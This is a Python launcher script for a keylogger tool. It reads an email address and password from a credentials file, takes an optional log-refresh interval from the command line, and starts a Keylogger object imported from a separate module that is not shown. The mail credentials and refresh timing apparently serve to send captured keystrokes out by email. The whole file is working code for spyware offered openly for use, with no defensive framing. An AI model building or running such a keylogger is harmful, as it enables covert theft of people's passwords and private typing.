#######################
# @author: RaffaDNDM
# @date:   2022-02-27
#######################

from key_logger import Keylogger
import argparse
import signal

def credentials():
    '''
    Evaluation of credentials
    '''

    with open('credentials.txt', "r") as f:
        credentials = ((f.read()).split('\n'))[0].split(' ')

    mail = credentials[0]
    password = credentials[1]

    return mail, password


def args_parser():
    '''
    Parser of command line arguments
    '''

    #Parser of command line arguments
    parser = argparse.ArgumentParser()
    
    #Initialization of needed arguments
    parser.add_argument("-refresh", "-t", dest="refresh_time", help="Refreshing time of log info")
    
    #Parse command line arguments
    args = parser.parse_args()
    
    #Check if the arguments have been specified on command line

    return args.refresh_time

def main():
    #Parser of command line arguments
    refresh_time = args_parser()
    
    #Read credentials from credentials file
    mail, password = credentials()

    #Creation of Keylogger
    if refresh_time:
        key_logger = Keylogger(mail, password, int(refresh_time))
    else:
        key_logger = Keylogger(mail, password)

    #Run the keylogger
    key_logger.start()

if __name__=='__main__':
    main()
